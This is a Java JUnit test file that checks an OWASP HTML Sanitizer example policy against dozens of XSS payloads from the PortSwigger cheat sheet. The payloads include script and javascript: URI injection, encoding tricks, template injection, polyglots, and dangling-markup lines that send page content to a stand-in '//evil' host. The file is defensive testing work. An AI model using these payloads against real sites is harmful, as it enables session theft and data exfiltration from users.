package org.owasp.html.examples;

import junit.framework.TestCase;
import org.junit.Test;

import java.util.Arrays;
import java.util.List;

public class NaverPolicyExampleTest extends TestCase {

  /**
   * original source : https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
   */

  @Test
  public void testRestrictedCharacters() {
    List<String> attackStringList = Arrays.asList(
            "<script>onerror=alert;throw 1</script>",
            "<script>{onerror=alert}throw 1</script>",
            "<script>throw onerror=alert,1</script>",
            "<script>throw onerror=eval,'=alert\\x281\\x29'</script>",
            "<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\\x281\\x29'}</script>",
            "<script>'alert\\x281\\x29'instanceof{[Symbol.hasInstance]:eval}</script>",
            "<script>'alert\\x281\\x29'instanceof{[Symbol['hasInstance']]:eval}</script>",
            "<script>location='javascript:alert\\x281\\x29'</script>",
            "<script>location=name</script>",
            "<script>alert`1`</script>",
            "<script>new Function`X${document.location.hash.substr`1`}`</script>",
            "<script>Function`X${document.location.hash.substr`1`}```</script>"
    );

    for (String eachAttackString : attackStringList) {
      assertEquals("", NaverPolicyExample.sanitize(eachAttackString));
    }
  }

  @Test
  public void testFrameworks() {
    List<String> attackStringList = Arrays.asList(
            "<xss class=progress-bar-animated onanimationstart=alert(1)>",
            "<xss class=\"carousel slide\" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class=\"carousel-item active\"></xss><xss class=carousel-item></xss></xss></xss>"
    );

    for (String eachAttackString : attackStringList) {
      assertEquals("", NaverPolicyExample.sanitize(eachAttackString));
    }
  }

  @Test
  public void testProtocols() {
    String attackString = "<iframe src=\"javascript:alert(1)\">";
    String cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<object data=\"javascript:alert(1)\">";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);


    attackString = "<embed src=\"javascript:alert(1)\">";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<a href=\"javascript:alert(1)\">XSS</a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a>XSS</a>", cleanString);

    attackString = "<a href=\"JaVaScript:alert(1)\">XSS</a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a>XSS</a>", cleanString);

    attackString = "<a href=\" \tjavascript:alert(1)\">XSS</a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a>XSS</a>", cleanString);

    attackString = "<a href=\"javas\tcript:alert(1)\">XSS</a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a>XSS</a>", cleanString);

    attackString = "<a href=\"javascript\n"
            + ":alert(1)\">XSS</a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a>XSS</a>", cleanString);

    attackString = "<svg><a xlink:href=\"javascript:alert(1)\"><text x=\"20\" y=\"20\">XSS</text></a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a>XSS</a>", cleanString);

    attackString = "<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a id=\"xss\">XSS</a>", cleanString);

    attackString = "<svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a id=\"xss\">XSS</a>", cleanString);

    attackString = "<svg><set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a id=\"xss\">XSS</a>", cleanString);

    attackString = "<script src=\"data:text/javascript,alert(1)\"></script>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<svg><script href=\"data:text/javascript,alert(1)\" />";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x\"></use></svg>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<script>import('data:text/javascript,alert(1)')</script>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<base href=\"javascript:/a/-alert(1)///////\"><a href=../lol/safari.html>test</a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a href=\"../lol/safari.html\">test</a>", cleanString);

    attackString = "<math><x href=\"javascript:alert(1)\">blah";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("blah", cleanString);

    attackString = "<form><button formaction=javascript:alert(1)>XSS";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<form><button>XSS</button></form>", cleanString);

    attackString = "<form><input type=submit formaction=javascript:alert(1) value=XSS>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<form><input type=\"submit\" value=\"XSS\" /></form>", cleanString);

    attackString = "<form action=javascript:alert(1)><input type=submit value=XSS>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<form><input type=\"submit\" value=\"XSS\" /></form>", cleanString);

    attackString = "<isindex type=submit formaction=javascript:alert(1)>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<isindex type=submit action=javascript:alert(1)>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<svg><use href=\"//subdomain1.portswigger-labs.net/use_element/upload.php#x\" /></svg>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values=\"https://portswigger.net?&semi;javascript:alert(1)&semi;0\" /><a id=xss><text x=20 y=20>XSS</text></a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a id=\"xss\">XSS</a>", cleanString);
  }

  @Test
  public void testOtherUsefulAttributes() {
    String attackString = "<iframe srcdoc=\"<img src=1 onerror=alert(1)>\"></iframe>";
    String cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<iframe srcdoc=\"&lt;img src=1 onerror=alert(1)&gt;\"></iframe>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<form action=\"javascript:alert(1)\"><input type=submit id=x></form><label for=x>XSS</label>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<form><input type=\"submit\" id=\"x\" /></form><label for=\"x\">XSS</label>", cleanString);

    attackString = "<input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\"> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<input type=\"hidden\" accesskey=\"X\" /> (Press ALT&#43;SHIFT&#43;X on Windows) (CTRL&#43;ALT&#43;X on OS X)", cleanString);

    attackString = "<link rel=\"canonical\" accesskey=\"X\" onclick=\"alert(1)\" /> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals(" (Press ALT&#43;SHIFT&#43;X on Windows) (CTRL&#43;ALT&#43;X on OS X)", cleanString);

    attackString = "<a href=# download=\"filename.html\">Test</a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a href=\"#\">Test</a>", cleanString);

    attackString = "<img referrerpolicy=\"no-referrer\" src=\"//portswigger-labs.net\">";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<img src=\"//portswigger-labs.net\" />", cleanString);

    attackString = "<a href=# onclick=\"window.open('http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//','alert(1)')\">XSS</a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a href=\"#\">XSS</a>", cleanString);

    attackString = "<iframe name=\"alert(1)\" src=\"https://portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//\"></iframe>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<base target=\"alert(1)\"><a href=\"http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//\">XSS via target in base tag</a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a href=\"http://subdomain1.portswigger-labs.net/xss/xss.php?context&#61;js_string_single&amp;x&#61;%27;eval%28name%29//\">XSS via target in base tag</a>", cleanString);

    attackString = "<a target=\"alert(1)\" href=\"http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//\">XSS via target in a tag</a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a target=\"alert(1)\" href=\"http://subdomain1.portswigger-labs.net/xss/xss.php?context&#61;js_string_single&amp;x&#61;%27;eval%28name%29//\" rel=\"noopener noreferrer\">XSS via target in a tag</a>", cleanString);

    attackString = "<img src=\"validimage.png\" width=\"10\" height=\"10\" usemap=\"#xss\"><map name=\"xss\"><area shape=\"rect\" coords=\"0,0,82,126\" target=\"alert(1)\" href=\"http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//\"></map>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<img src=\"validimage.png\" width=\"10\" height=\"10\" usemap=\"#xss\" /><map name=\"xss\"><area shape=\"rect\" coords=\"0,0,82,126\" target=\"alert(1)\" href=\"http://subdomain1.portswigger-labs.net/xss/xss.php?context&#61;js_string_single&amp;x&#61;%27;eval%28name%29//\" /></map>", cleanString);

    attackString = "<form action=\"http://subdomain1.portswigger-labs.net/xss/xss.php\" target=\"alert(1)\"><input type=hidden name=x value=\"';eval(name)//\"><input type=hidden name=context value=js_string_single><input type=\"submit\" value=\"XSS via target in a form\"></form>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<form action=\"http://subdomain1.portswigger-labs.net/xss/xss.php\" target=\"alert(1)\"><input type=\"hidden\" name=\"x\" value=\"&#39;;eval(name)//\" /><input type=\"hidden\" name=\"context\" value=\"js_string_single\" /><input type=\"submit\" value=\"XSS via target in a form\" /></form>", cleanString);

    attackString = "<form><input type=hidden name=x value=\"';eval(name)//\"><input type=hidden name=context value=js_string_single><input type=\"submit\" formaction=\"http://subdomain1.portswigger-labs.net/xss/xss.php\" formtarget=\"alert(1)\" value=\"XSS via formtarget in input type submit\"></form>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<form><input type=\"hidden\" name=\"x\" value=\"&#39;;eval(name)//\" /><input type=\"hidden\" name=\"context\" value=\"js_string_single\" /><input type=\"submit\" formtarget=\"alert(1)\" value=\"XSS via formtarget in input type submit\" /></form>", cleanString);

    attackString = "<form><input type=hidden name=x value=\"';eval(name)//\"><input type=hidden name=context value=js_string_single><input name=1 type=\"image\" src=\"validimage.png\" formaction=\"http://subdomain1.portswigger-labs.net/xss/xss.php\" formtarget=\"alert(1)\" value=\"XSS via formtarget in input type image\"></form>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<form><input type=\"hidden\" name=\"x\" value=\"&#39;;eval(name)//\" /><input type=\"hidden\" name=\"context\" value=\"js_string_single\" /><input name=\"1\" type=\"image\" src=\"validimage.png\" formtarget=\"alert(1)\" value=\"XSS via formtarget in input type image\" /></form>", cleanString);

  }

  public void testSpecialTags() {
    String attackString = "<meta http-equiv=\"refresh\" content=\"0; url=//portswigger-labs.net\">";
    String cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<meta charset=\"UTF-7\" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals(" &#43;ADw-script&#43;AD4-alert(1)&#43;ADw-/script&#43;AD4-", cleanString);

    attackString = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-7\" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals(" &#43;ADw-script&#43;AD4-alert(1)&#43;ADw-/script&#43;AD4-", cleanString);

    attackString = "+/v8 ADw-script+AD4-alert(1)+ADw-/script+AD4-";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("&#43;/v8 ADw-script&#43;AD4-alert(1)&#43;ADw-/script&#43;AD4-", cleanString);

    attackString = "<meta http-equiv=\"Content-Security-Policy\" content=\"upgrade-insecure-requests\">";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<iframe sandbox src=\"//portswigger-labs.net\"></iframe>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<meta name=\"referrer\" content=\"no-referrer\">";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);
  }

  public void testEncoding() {
    String attackString = "%C0%BCscript>alert(1)</script>";
    String cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("%C0%BCscript&gt;alert(1)", cleanString);

    attackString = "%E0%80%BCscript>alert(1)</script>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("%E0%80%BCscript&gt;alert(1)", cleanString);

    attackString = "%F0%80%80%BCscript>alert(1)</script>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("%F0%80%80%BCscript&gt;alert(1)", cleanString);

    attackString = "%F8%80%80%80%BCscript>alert(1)</script>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("%F8%80%80%80%BCscript&gt;alert(1)", cleanString);

    attackString = "%FC%80%80%80%80%BCscript>alert(1)</script>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("%FC%80%80%80%80%BCscript&gt;alert(1)", cleanString);

    attackString = "<script>\\u0061lert(1)</script>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<script>\\u{61}lert(1)</script>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<script>\\u{0000000061}lert(1)</script>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<script>eval('\\x61lert(1)')</script>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<script>eval('\\141lert(1)')</script>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<script>eval('alert(\\061)')</script>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<script>eval('alert(\\61)')</script>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<a href=\"&#106;avascript:alert(1)\">XSS</a><a href=\"&#106avascript:alert(1)\">XSS</a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a>XSS</a><a href=\"&amp;#106avascript:alert%281%29\">XSS</a>", cleanString);

    attackString = "<svg><script>&#97;lert(1)</script></svg>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<svg><script>&#x61;lert(1)</script></svg>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<svg><script>alert&NewLine;(1)</script></svg>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<svg><script>x=\"&quot;,alert(1)//\";</script></svg>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<a href=\"&#0000106avascript:alert(1)\">XSS</a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a href=\"&amp;#0000106avascript:alert%281%29\">XSS</a>", cleanString);

    attackString = "<a href=\"&#x6a;avascript:alert(1)\">XSS</a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a>XSS</a>", cleanString);

    attackString = "<a href=\"j&#x61vascript:alert(1)\">XSS</a> <a href=\"&#x6aavascript:alert(1)\">XSS</a><a href=\"&#x6a avascript:alert(1)\">XSS</a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a href=\"j&amp;#x61vascript:alert%281%29\">XSS</a> <a href=\"&amp;#x6aavascript:alert%281%29\">XSS</a><a>XSS</a>", cleanString);

    attackString = "<a href=\"&#x0000006a;avascript:alert(1)\">XSS</a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a>XSS</a>", cleanString);

    attackString = "<a href=\"&#X6A;avascript:alert(1)\">XSS</a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a>XSS</a>", cleanString);

    attackString = "<a href=\"javascript&colon;alert(1)\">XSS</a>\n"
            + "<a href=\"java&Tab;script:alert(1)\">XSS</a>\n"
            + "<a href=\"java&NewLine;script:alert(1)\">XSS</a>\n"
            + "<a href=\"javascript&colon;alert&lpar;1&rpar;\">XSS</a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a>XSS</a>\n"
            + "<a>XSS</a>\n"
            + "<a>XSS</a>\n"
            + "<a>XSS</a>", cleanString);

    attackString = "<a href=\"javascript:x='%27-alert(1)-%27';\">XSS</a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a>XSS</a>", cleanString);

    attackString = "<a href=\"javascript:x='&percnt;27-alert(1)-%27';\">XSS</a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a>XSS</a>", cleanString);
  }

  public void testObfuscation() {
    String attackString = "<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>";
    String cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<iframe src=\"javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'\"></iframe>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);
  }

  public void testClientSideTemplateInjection() {
    String attackString = "<div v-html=\"''.constructor.constructor('alert(1)')()\">a</div>";
    String cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<div>a</div>", cleanString);

    attackString = "<x v-html=_c.constructor('alert(1)')()>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<input autofocus ng-focus=\"$event.path|orderBy:'[].constructor.from([1],alert)'\">";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<input autofocus=\"autofocus\" />", cleanString);

    attackString = "<input id=x ng-focus=$event.path|orderBy:'(z=alert)(1)'>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<input id=\"x\" />", cleanString);

    attackString = "<input autofocus ng-focus=\"$event.composedPath()|orderBy:'[].constructor.from([1],alert)'\">";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<input autofocus=\"autofocus\" />", cleanString);

    attackString = "<div ng-app ng-csp><div ng-focus=\"x=$event;\" id=f tabindex=0>foo</div><div ng-repeat=\"(key, value) in x.view\"><div ng-if=\"key == 'window'\">{{ [1].reduce(value.alert, 1); }}</div></div></div>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<div><div id=\"f\" tabindex=\"0\">foo</div><div><div>{<!-- -->{ [1].reduce(value.alert, 1); }}</div></div></div>", cleanString);
  }

  public void testScriptlessAttacks() {
    String attackString = "<body background=\"//evil?\n"
            + "<table background=\"//evil?\n"
            + "<table><thead background=\"//evil?\n"
            + "<table><tbody background=\"//evil?\n"
            + "<table><tfoot background=\"//evil?\n"
            + "<table><td background=\"//evil?\n"
            + "<table><th background=\"//evil?";
    String cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<table><thead></thead><tfoot><table><tbody><tr><th></th></tr></tbody></table></tfoot></table>", cleanString);

    attackString = "<link rel=stylesheet href=\"//evil?";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<link rel=icon href=\"//evil?";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<meta http-equiv=\"refresh\" content=\"0; http://evil?";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<img src=\"//evil?\n"
            + "<image src=\"//evil?";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<img src=\"//evil?%0a&lt;image%20src&#61;\" />", cleanString);

    attackString = "<video><track default src=\"//evil?";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<video><track default=\"default\" src=\"&#34;//evil?\" /></video>", cleanString);

    attackString = "<video><source src=\"//evil?";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<video><source src=\"&#34;//evil?\" /></video>", cleanString);

    attackString = "<audio><source src=\"//evil?";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<audio><source src=\"&#34;//evil?\" /></audio>", cleanString);

    attackString = "<input type=image src=\"//evil?";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<input type=\"image\" src=\"&#34;//evil?\" />", cleanString);

    attackString = "<form><button style=\"width:100%;height:100%\" type=submit formaction=\"//evil?";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<form><button style=\"width:100%;height:100%\" type=\"submit\"></button></form>", cleanString);

    attackString = "<form><input type=submit value=\"XSS\" style=\"width:100%;height:100%\" type=submit formaction=\"//evil?";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<form><input type=\"submit\" value=\"XSS\" style=\"width:100%;height:100%\" /></form>", cleanString);

    attackString = "<button form=x style=\"width:100%;height:100%;\"><form id=x action=\"//evil?";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<button form=\"x\" style=\"width:100%;height:100%\"><form id=\"x\" action=\"&#34;//evil?\"></form></button>", cleanString);

    attackString = "<isindex type=image src=\"//evil?";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<isindex type=submit style=width:100%;height:100%; value=XSS formaction=\"//evil?";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<object data=\"//evil?";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<iframe src=\"//evil?";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<embed src=\"//evil?";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<form><button formaction=//evil>XSS</button><textarea name=x>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<form><button>XSS</button><textarea name=\"x\"></textarea></form>", cleanString);

    attackString = "<button form=x>XSS</button><form id=x action=//evil target='";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<button form=\"x\">XSS</button><form id=\"x\" action=\"//evil\" target=\"\"></form>", cleanString);

    attackString = "<a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target=\"";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a href=\"http://subdomain1.portswigger-labs.net/dangling_markup/name.html\"><font size=\"100\" color=\"red\">You must click me</font></a>", cleanString);

    attackString = "<form><input type=submit value=\"Click me\" formaction=http://subdomain1.portswigger-labs.net/dangling_markup/name.html formtarget=\"";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<form><input type=\"submit\" value=\"Click me\" formtarget=\"\" /></form>", cleanString);

    attackString = "<a href=abc style=\"width:100%;height:100%;position:absolute;font-size:1000px;\">xss<base href=\"//evil/";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a href=\"abc\">xss</a>", cleanString);

    attackString = "<embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=\"";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=\"";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=\"";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<frameset><frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=\"";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<frameset><frame src=\"http://subdomain1.portswigger-labs.net/dangling_markup/name.html\" name=\"\"></frame></frameset>", cleanString);
  }

  public void testPolyglots() {
    String attackString = "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>";
    String cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("javascript:/*--&gt;", cleanString);

    attackString = "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\\"\n"
            + " onmouseover=/*&lt;svg/*/onload=alert()//>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("javascript:&#34;/*&#39;/*&#96;/*--&gt;<html></html>", cleanString);
  }

  public void testClassicVectors() {
    String attackString = "<img src=\"javascript:alert(1)\">";
    String cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<img />", cleanString);

    attackString = "<body background=\"javascript:alert(1)\">";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<iframe src=\"data:text/html,<img src=1 onerror=alert(document.domain)>\">";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<a href=\"vbscript:MsgBox+1\">XSS</a>\n"
            + "<a href=\"#\" onclick=\"vbs:Msgbox+1\">XSS</a>\n"
            + "<a href=\"#\" onclick=\"VBS:Msgbox+1\">XSS</a>\n"
            + "<a href=\"#\" onclick=\"vbscript:Msgbox+1\">XSS</a>\n"
            + "<a href=\"#\" onclick=\"VBSCRIPT:Msgbox+1\">XSS</a>\n"
            + "<a href=\"#\" language=vbs onclick=\"vbscript:Msgbox+1\">XSS</a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a>XSS</a>\n"
            + "<a href=\"#\">XSS</a>\n"
            + "<a href=\"#\">XSS</a>\n"
            + "<a href=\"#\">XSS</a>\n"
            + "<a href=\"#\">XSS</a>\n"
            + "<a href=\"#\">XSS</a>", cleanString);

    attackString = "<a href=\"#\" onclick=\"jscript.compact:alert(1);\">test</a>\n"
            + "<a href=\"#\" onclick=\"JSCRIPT.COMPACT:alert(1);\">test</a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a href=\"#\">test</a>\n"
            + "<a href=\"#\">test</a>", cleanString);

    attackString = "<a href=# language=\"JScript.Encode\" onclick=\"#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@\">XSS</a>\n"
            + "<a href=# onclick=\"JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@\">XSS</a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a href=\"#\">XSS</a>\n"
            + "<a href=\"#\">XSS</a>", cleanString);

    attackString = "<iframe onload=VBScript.Encode:#@~^CAAAAA==\\ko$K6,FoQIAAA==^#~@>\n"
            + "<iframe language=VBScript.Encode onload=#@~^CAAAAA==\\ko$K6,FoQIAAA==^#~@>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<a title=\"&{alert(1)}\">XSS</a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a title=\"&amp;{alert(1)}\">XSS</a>", cleanString);

    attackString = "<link href=\"xss.js\" rel=stylesheet type=\"text/javascript\">";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<form><button name=x formaction=x><b>stealme";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<form><button name=\"x\"><b>stealme</b></button></form>", cleanString);

    attackString = "<form action=x><button>XSS</button><select name=x><option><plaintext><script>token=\"supersecret\"</script>";
